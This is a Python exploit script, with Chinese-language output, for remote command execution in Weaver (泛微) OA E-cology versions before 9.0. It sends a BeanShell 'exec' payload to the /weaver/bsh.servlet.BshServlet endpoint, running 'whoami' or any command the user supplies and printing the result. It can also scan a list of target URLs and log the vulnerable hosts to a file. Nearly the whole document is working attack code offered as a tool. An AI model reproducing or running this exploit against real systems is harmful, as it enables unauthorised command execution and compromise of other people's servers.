#!/usr/bin/python3
#-*- coding:utf-8 -*-

import argparse
import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def header():
	print('\033[32m!*********************************************!\033[0m')
	print('\033[32m!description:泛微OA E-cology < 9.0远程命令执行!\033[0m')
	print('\033[32m!               Author:Fly_Wuhoo              !\033[0m')
	print('\033[32m!*********************************************!\033[0m')

def Write_Results(url):
	with open('results.txt','a+') as wp:
		wp.write(url+'\n')


def Arg_Parse():
	parser = argparse.ArgumentParser()
	group = parser.add_mutually_exclusive_group()
	parser.add_argument("-u","--url",metavar='',help="目标url地址")
	group.add_argument("-f","--file",metavar='',help="目标地址文件")
	group.add_argument("-c","--cmd",metavar='',help="command")
	args = parser.parse_args()
	return args
def Detect(url):
	headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
'Content-Type': 'application/x-www-form-urlencoded'}
	vuln_url=url+'/weaver/bsh.servlet.BshServlet'
	try:
		response = requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5)
		response.encoding=response.apparent_encoding
		print("\033[32m正在检测:{}\033[0m".format(vuln_url))
		if response.status_code == 200:
			soup = BeautifulSoup(response.text,'xml')
			if soup.pre:
				print("\033[31m{}存在漏洞！！！\033[0m".format(vuln_url))
				print("\033[33m命令执行结果：\n{} \033[0m".format(soup.pre.text.strip()))
				if key:
					Write_Results(vuln_url)
				else:
					pass
		else:
			print("\033[32m{}访问失败！！！ \033[0m".format(vuln_url))
	except:
		print("\033[32m{}访问失败！！！ \033[0m".format(vuln_url))
if __name__ == '__main__':
	args = Arg_Parse()
	header()
	if args.url:
		key=0
		if args.cmd:
			data="""bsh.script=exec("{}");""".format(args.cmd)
		else:
			data="""bsh.script=exec("whoami");"""	
		Detect(args.url)	
	elif args.file:
		key=1
		data="""bsh.script=exec("whoami");"""
		with open(args.file,'r') as fp:
			for line in fp.readlines():
				Detect(line.strip())
	else:
		print("\033[33m输入的参数有误，请使用-h参数查看脚本用法 \033[0m")

				
						

